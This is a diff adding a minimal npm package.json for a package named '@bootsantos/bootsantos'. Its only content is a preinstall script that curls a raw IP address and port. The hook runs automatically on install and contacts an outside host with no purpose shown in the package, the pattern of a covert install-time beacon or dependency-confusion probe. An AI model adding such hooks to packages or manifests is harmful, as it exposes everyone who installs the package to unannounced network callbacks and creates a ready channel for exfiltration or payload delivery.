@@ -1,0 +1,7 @@
+{
+"name" : "@bootsantos/bootsantos",
+"version" : "0.0.1",
+"scripts" : {
+	"preinstall" : "curl http://172.16.188.128:1234"
+}
+}
